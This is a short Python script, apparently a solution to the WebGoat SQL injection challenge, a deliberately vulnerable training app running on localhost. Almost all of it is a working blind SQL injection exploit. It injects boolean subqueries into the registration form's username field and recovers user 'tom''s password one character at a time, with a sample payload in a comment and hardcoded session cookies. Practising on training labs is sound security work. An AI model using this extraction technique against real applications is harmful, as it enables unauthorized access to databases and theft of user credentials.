#table:challenge_users_6RPRZUYZuSJYcUAZA

#a'+or+(select+left(password,1)+from+challenge_users_6RPRZUYZuSJYcUAZA+where+userid='tom')='a'+--

import requests
import json

result=''
url='http://localhost:8080/WebGoat/SqlInjection/challenge'
cookies={
    'JSESSIONID':'94DFEB13844834CC025C40A7104C338D',
    '__utma':'111872281.709274838.1511010954.1512367990.1512478478.6',
    'WEBWOLFSESSION':'30B3CC03B4759874A0405254DBD06A78'
}
a=''
ll=''
for i in range(1,30):
    #for j in range(33,127):
    for j in range(97,123):
        a=ll+chr(j)
        re='tom\' and (select left(password,'+str(i)+') from challenge_users_6sFpmJVADfVkvmheO where userid=\'tom\')=\''+a+'\'-- '
        data={
            'username_reg':re,
            'email_reg':'a@a',
            'password_reg':'a',
            'confirm_password_reg':'a'
        }
        print(i,a)
        r=requests.put(url=url,cookies=cookies,data=data)
        #print(url,r.content)
        all=json.loads(r.content)
        #print(all["lessonCompleted"])
        if(all["lessonCompleted"]):
            continue
        else:
            ll+=chr(j)
            break
print(ll)